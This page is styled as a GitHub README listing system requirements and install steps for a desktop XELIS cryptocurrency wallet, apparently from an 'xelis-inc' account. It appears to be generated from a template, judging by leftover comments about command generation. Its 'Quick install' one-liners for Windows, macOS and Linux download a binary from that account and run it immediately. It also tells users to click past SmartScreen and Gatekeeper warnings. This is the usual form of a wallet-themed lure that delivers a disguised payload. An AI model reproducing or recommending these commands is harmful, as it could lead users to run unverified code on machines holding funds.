![XELIS Wallet system requirements and unsupported platforms](assets/banner-article.png)
# XELIS Wallet system requirements and unsupported platforms

What runs the desktop app, what does not, and how to check in one step.

## Downloads - Requirements

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> An unsupported platform rarely fails gracefully: it usually fails at launch, which looks like a broken download.

XELIS Wallet is a desktop application for 64-bit Windows 10 build 1909 or later, macOS 12 or later on Intel or Apple Silicon, and x64 Linux. This release has no phone app and no browser build, and 32-bit systems are not supported.

<!-- ARTICLE-BODY-BEGIN -->
## The supported list, without padding

| Platform | Runs this release | Notes |
| --- | --- | --- |
| Windows 10 (1909) or later, 64-bit | Yes | Installer |
| Windows 11, 64-bit | Yes | Installer |
| macOS 12 or later | Yes | Universal build for Intel and Apple Silicon |
| Linux x64, Ubuntu 20.04 or equivalent | Yes | Archive you extract |
| 32-bit Windows or Linux | No | Installer or binary will not run |
| macOS 11 or older | No | The app will not open |
| Phones and tablets | No | The project's cross-platform client covers those |
| Browsers | No | Nothing to load in a tab |

Memory and disk figures are deliberately absent. The release does not publish them in a form these docs can verify, and an invented figure is worse than no figure: it sends people to buy hardware they do not need.

## Why old systems fail instead of degrading

A build compiled for a newer operating system calls runtime features an older one does not provide. The failure happens before any window appears, so macOS may report the app as damaged and Windows may report a missing entry point.

Neither message means the file is corrupt. It means the build and the machine disagree, and the fix is a supported machine, not a different download of the same build.

## Check the machine in one step

On Windows, open Settings, then System, then About, and read the System type line: it must say 64-bit. On macOS, open the Apple menu, choose About This Mac, and read the chip line; either chip is fine on macOS 12 or later. On Linux, run `uname -m` and expect `x86_64`.

That single line settles the question the download table cannot: which build belongs on this machine. On Windows the install route is <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md">install XELIS Wallet on Windows</a>, which covers the installer and the SmartScreen prompt.

On a Mac the equivalent walk-through is <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-macos-install-dmg.md">install XELIS Wallet on macOS</a>, where the DMG, the Gatekeeper approval and the chip check live.

On Linux it is <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-linux-unzip-permissions-launch.md">install XELIS Wallet on Linux</a>, which starts at the archive and ends with the first error readable in a terminal.

## If your machine is not on the list

Upgrade the operating system, or use a machine that is supported. Running a desktop build on a phone through an emulator is outside what these docs can support.

Do not assume a 32-bit build exists because an old download did. The <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> is the supported surface, and older assets are not maintained as install paths here.

## FAQ
### What are the XELIS Wallet system requirements?
64-bit Windows 10 (1909) or later, macOS 12 or later, or x64 Linux such as Ubuntu 20.04 or equivalent. 32-bit systems are not supported.

### Which platforms does XELIS Wallet support?
Windows, macOS and Linux desktops. There is no phone build and no browser build of this release.

### Can I run XELIS Wallet on a phone?
Not this release. It is a desktop application; the project's separate cross-platform client is the mobile option.

### Does the wallet need a dedicated graphics card?
No. It is a desktop application, not mining software; mining hardware is a separate subject covered by the Xelishash article.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Install XELIS Wallet on Windows](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-windows-download-install.md)
- [Install XELIS Wallet on macOS](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-macos-install-dmg.md)
- [Install XELIS Wallet on Linux](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-linux-unzip-permissions-launch.md)
- [XELIS Wallet or Genesix](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-or-genesix-client.md)
